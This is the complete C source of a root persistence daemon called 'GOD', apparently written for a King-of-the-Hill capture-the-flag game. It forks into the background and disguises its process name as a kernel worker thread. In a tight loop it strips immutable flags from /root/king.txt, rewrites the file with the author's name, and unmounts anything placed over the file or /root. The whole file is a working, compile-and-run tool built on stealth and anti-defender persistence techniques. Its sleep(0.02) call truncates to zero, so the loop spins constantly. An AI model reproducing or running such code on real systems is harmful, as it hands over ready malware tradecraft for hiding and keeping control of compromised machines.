
/* 
------------------------------- 
King Protection: GOD 
Author: Trevohack AKA Trev 
------------------------------- 
Usage: ./god 
Compile: gcc god.c -o god 
*/ 

#define _GNU_SOURCE
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h> 
#include <sys/ioctl.h>
#include <linux/fs.h>


#define KINGFILE "/root/king.txt"
#define KINGNAME "Trevohack\n"
#define ROOTDIR  "/root"

void clear_immutable(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return;

    int flags;
    if (ioctl(fd, FS_IOC_GETFLAGS, &flags) == 0) {
        if (flags & (FS_IMMUTABLE_FL | FS_APPEND_FL)) {
            flags &= ~(FS_IMMUTABLE_FL | FS_APPEND_FL);
            ioctl(fd, FS_IOC_SETFLAGS, &flags);
        }
    }
    close(fd);
}

void hide_proc(char *argv0) {
    prctl(PR_SET_NAME, (unsigned long)"[kworker/u8:2]", 0, 0, 0);
    size_t len = strlen(argv0);
    memset(argv0, 0, len);
    strncpy(argv0, "[kworker/u8:2]", len - 1);
}

void restore_root() {
    struct stat st;
    if (lstat(ROOTDIR, &st) < 0 || !S_ISDIR(st.st_mode)) {
        mkdir(ROOTDIR, 0700);
    }
}

void restore_king() {
    clear_immutable(KINGFILE);
    unlink(KINGFILE); 
    int fd = open(KINGFILE, O_CREAT|O_WRONLY|O_TRUNC, 0644);
    if (fd >= 0) {
        write(fd, KINGNAME, strlen(KINGNAME));
        close(fd);
    }
}


void verify_file() {
    clear_immutable(KINGFILE);
    struct stat st;
    if (lstat(KINGFILE, &st) < 0 || !S_ISREG(st.st_mode)) {
        restore_king();
        return;
    }
    FILE *fp = fopen(KINGFILE, "r");
    if (!fp) { restore_king(); return; }
    char buf[64] = {0};
    fread(buf, 1, sizeof(buf)-1, fp);
    fclose(fp);
    if (strcmp(buf, KINGNAME) != 0) restore_king();
}


int main(int argc, char **argv) {
    if (fork() > 0) exit(0);
    setsid();
    if (fork() > 0) exit(0);
    chdir("/");
    umask(0);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    hide_proc(argv[0]);

    restore_root();
    restore_king();

    while (1) {
        restore_root();
        verify_file();
        umount2(KINGFILE, MNT_DETACH);
        umount2(ROOTDIR, MNT_DETACH);
        sleep(0.02);
    }
    return 0;
}
